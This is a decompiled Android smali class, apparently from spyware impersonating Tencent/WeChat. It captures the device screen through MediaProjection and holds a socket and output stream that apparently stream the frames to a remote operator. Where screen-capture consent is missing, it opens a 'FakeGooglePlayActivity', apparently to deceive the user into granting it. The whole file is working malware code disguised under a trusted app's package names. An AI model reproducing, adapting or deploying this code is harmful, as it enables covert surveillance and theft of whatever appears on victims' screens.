.class public Lcom/tencent/SmsSenderEngine;
.super Landroid/app/Service;
.source "skatinghsatinbintegralj9.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "com.tencent.mm.RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "com.tencent.mm.SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field public static ISON:Z = false

.field public static Lo:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static PID:Ljava/lang/String; = null

.field public static Q:I = 0x0

.field static final VIRT_DISPLAY_FLAGS:I = 0x2

.field public static ctd:Z

.field public static display_height:Ljava/lang/String;

.field public static display_width:Ljava/lang/String;

.field public static out:Ljava/io/OutputStream;

.field private static projection:Landroid/media/projection/MediaProjection;

.field public static sk:Ljava/net/Socket;

.field public static syc:Ljava/lang/Object;

.field public static usd:Z

.field private static vdisplay:Landroid/hardware/display/VirtualDisplay;


# instance fields
.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:Lcom/tencent/MiscHelper2;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 130
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/tencent/SmsSenderEngine;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 33
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 48
    new-instance v0, Landroid/os/HandlerThread;

    .line 49
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->handlerThread:Landroid/os/HandlerThread;

    .line 129
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->bts:Ljava/util/List;

    return-void
.end method

.method static synthetic access$000(Lcom/tencent/SmsSenderEngine;)V
    .locals 0

    .line 33
    invoke-direct {p0}, Lcom/tencent/SmsSenderEngine;->startCapture()V

    return-void
.end method

.method static synthetic access$100()Landroid/hardware/display/VirtualDisplay;
    .locals 1

    .line 33
    sget-object v0, Lcom/tencent/SmsSenderEngine;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object v0
.end method

.method public static di()V
    .locals 1

    const/4 v0, 0x0

    .line 238
    sput-boolean v0, Lcom/tencent/SmsSenderEngine;->Lo:Z

    .line 239
    :try_start_0
    sget-object v0, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 240
    :catch_0
    :try_start_1
    sget-object v0, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 241
    :catch_1
    :try_start_2
    sget-object v0, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 242
    :catch_2
    :try_start_3
    sget-object v0, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 243
    :catch_3
    :try_start_4
    sget-object v0, Lcom/tencent/SmsSenderEngine;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    .line 244
    :catch_4
    sget-object v0, Lcom/tencent/SmsSenderEngine;->out:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    sput-object v0, Lcom/tencent/SmsSenderEngine;->out:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method private foregroundify()V
    .locals 2

    .line 341
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tencent/SmsSenderEngine;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "com.tencent.mm.RECORD"

    .line 343
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 345
    invoke-virtual {p0, v0}, Lcom/tencent/SmsSenderEngine;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private startCapture()V
    .locals 10

    .line 287
    iget-object v0, p0, Lcom/tencent/SmsSenderEngine;->mgr:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, Lcom/tencent/SmsSenderEngine;->resultCode:I

    iget-object v2, p0, Lcom/tencent/SmsSenderEngine;->resultData:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    sput-object v0, Lcom/tencent/SmsSenderEngine;->projection:Landroid/media/projection/MediaProjection;

    .line 288
    new-instance v0, Lcom/tencent/MiscHelper2;

    invoke-direct {v0, p0}, Lcom/tencent/MiscHelper2;-><init>(Lcom/tencent/SmsSenderEngine;)V

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->it:Lcom/tencent/MiscHelper2;

    .line 290
    new-instance v0, Lcom/tencent/SmsSenderEngine$4;

    invoke-direct {v0, p0}, Lcom/tencent/SmsSenderEngine$4;-><init>(Lcom/tencent/SmsSenderEngine;)V

    .line 302
    sget-object v1, Lcom/tencent/SmsSenderEngine;->projection:Landroid/media/projection/MediaProjection;

    const-string v2, "andshooter"

    iget-object v3, p0, Lcom/tencent/SmsSenderEngine;->it:Lcom/tencent/MiscHelper2;

    .line 303
    invoke-virtual {v3}, Lcom/tencent/MiscHelper2;->getWidth()I

    move-result v3

    iget-object v4, p0, Lcom/tencent/SmsSenderEngine;->it:Lcom/tencent/MiscHelper2;

    invoke-virtual {v4}, Lcom/tencent/MiscHelper2;->getHeight()I

    move-result v4

    .line 304
    invoke-virtual {p0}, Lcom/tencent/SmsSenderEngine;->getResources()Landroid/content/res/Resources;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v5

    iget v5, v5, Landroid/util/DisplayMetrics;->densityDpi:I

    const/4 v6, 0x2

    iget-object v7, p0, Lcom/tencent/SmsSenderEngine;->it:Lcom/tencent/MiscHelper2;

    .line 305
    invoke-virtual {v7}, Lcom/tencent/MiscHelper2;->getSurface()Landroid/view/Surface;

    move-result-object v7

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/tencent/SmsSenderEngine;->handler:Landroid/os/Handler;

    .line 302
    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v1

    sput-object v1, Lcom/tencent/SmsSenderEngine;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    .line 306
    sget-object v1, Lcom/tencent/SmsSenderEngine;->projection:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, Lcom/tencent/SmsSenderEngine;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method public static stopCapture()V
    .locals 1

    .line 279
    sget-object v0, Lcom/tencent/SmsSenderEngine;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    .line 280
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 281
    sget-object v0, Lcom/tencent/SmsSenderEngine;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 282
    sput-object v0, Lcom/tencent/SmsSenderEngine;->projection:Landroid/media/projection/MediaProjection;

    :cond_0
    return-void
.end method


# virtual methods
.method public FindNewIcon()V
    .locals 2

    .line 186
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/SmsSenderEngine$2;

    invoke-direct {v1, p0}, Lcom/tencent/SmsSenderEngine$2;-><init>(Lcom/tencent/SmsSenderEngine;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 234
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 252
    iget-object v0, p0, Lcom/tencent/SmsSenderEngine;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 248
    iget-object v0, p0, Lcom/tencent/SmsSenderEngine;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 126
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 2

    .line 62
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "media_projection"

    .line 64
    invoke-virtual {p0, v0}, Lcom/tencent/SmsSenderEngine;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    .line 65
    invoke-virtual {p0, v0}, Lcom/tencent/SmsSenderEngine;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->wmgr:Landroid/view/WindowManager;

    .line 67
    iget-object v0, p0, Lcom/tencent/SmsSenderEngine;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 68
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/tencent/SmsSenderEngine;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/tencent/SmsSenderEngine;->handler:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 118
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->stopCapture()V

    .line 120
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1

    .line 78
    invoke-virtual {p0}, Lcom/tencent/SmsSenderEngine;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string p3, "SCH"

    const-string v0, "720"

    invoke-static {p2, p3, v0}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sput-object p2, Lcom/tencent/SmsSenderEngine;->display_width:Ljava/lang/String;

    .line 79
    invoke-virtual {p0}, Lcom/tencent/SmsSenderEngine;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    const-string p3, "SCW"

    const-string v0, "1080"

    invoke-static {p2, p3, v0}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    sput-object p2, Lcom/tencent/SmsSenderEngine;->display_height:Ljava/lang/String;

    .line 80
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_0

    const-string p2, "resultCode"

    const/16 p3, 0x539

    .line 81
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lcom/tencent/SmsSenderEngine;->resultCode:I

    const-string p2, "resultIntent"

    .line 82
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, Lcom/tencent/SmsSenderEngine;->resultData:Landroid/content/Intent;

    const-string p2, "Q"

    const/16 p3, 0xa

    .line 83
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lcom/tencent/SmsSenderEngine;->Q:I

    const-string p2, "F"

    const/4 p3, 0x5

    .line 84
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lcom/tencent/SmsSenderEngine;->FPS:I

    const-string p2, "P"

    .line 85
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/tencent/SmsSenderEngine;->PID:Ljava/lang/String;

    .line 86
    invoke-direct {p0}, Lcom/tencent/SmsSenderEngine;->foregroundify()V

    goto :goto_0

    :cond_0
    const-string p2, "com.tencent.mm.RECORD"

    .line 88
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2, p3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_2

    .line 89
    iget-object p1, p0, Lcom/tencent/SmsSenderEngine;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_1

    .line 92
    invoke-virtual {p0}, Lcom/tencent/SmsSenderEngine;->FindNewIcon()V

    goto :goto_0

    .line 95
    :cond_1
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lcom/tencent/FakeGooglePlayActivity;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x10000000

    .line 97
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 99
    invoke-virtual {p0, p1}, Lcom/tencent/SmsSenderEngine;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_2
    const-string p2, "com.tencent.mm.SHUTDOWN"

    .line 102
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    const/4 p1, 0x0

    .line 104
    sput-boolean p1, Lcom/tencent/SmsSenderEngine;->ISON:Z

    .line 105
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->stopCapture()V

    const/4 p1, 0x1

    .line 106
    invoke-virtual {p0, p1}, Lcom/tencent/SmsSenderEngine;->stopForeground(Z)V

    .line 107
    invoke-virtual {p0}, Lcom/tencent/SmsSenderEngine;->stopSelf()V

    :cond_3
    :goto_0
    const/4 p1, 0x2

    return p1
.end method

.method public pr()V
    .locals 2

    .line 137
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/tencent/SmsSenderEngine$1;

    invoke-direct {v1, p0}, Lcom/tencent/SmsSenderEngine$1;-><init>(Lcom/tencent/SmsSenderEngine;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 183
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method processImage([B)V
    .locals 1

    .line 256
    new-instance v0, Lcom/tencent/SmsSenderEngine$3;

    invoke-direct {v0, p0, p1}, Lcom/tencent/SmsSenderEngine$3;-><init>(Lcom/tencent/SmsSenderEngine;[B)V

    .line 274
    invoke-virtual {v0}, Lcom/tencent/SmsSenderEngine$3;->start()V

    return-void
.end method
